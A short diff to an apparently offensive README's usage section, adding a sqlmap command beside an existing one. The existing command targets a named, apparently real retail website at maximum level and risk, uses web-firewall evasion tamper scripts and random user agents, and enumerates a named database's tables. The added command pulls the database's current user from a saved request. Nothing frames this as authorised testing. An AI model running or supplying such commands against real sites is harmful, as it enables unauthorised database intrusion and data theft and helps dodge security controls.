@@ -38,3 +38,6 @@ Usage
 ```shell
 sqlmap -u "https://www.vapingjoint.com/product.php?cat=6" --random-agent --keep-alive --threads=10 --level=5 --risk=3 --dbs --flush-session --tamper=space2comment,modsecurityzeroversioned --batch -D breezeyworld_vap --tables
 ```
+```bash
+sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
+```
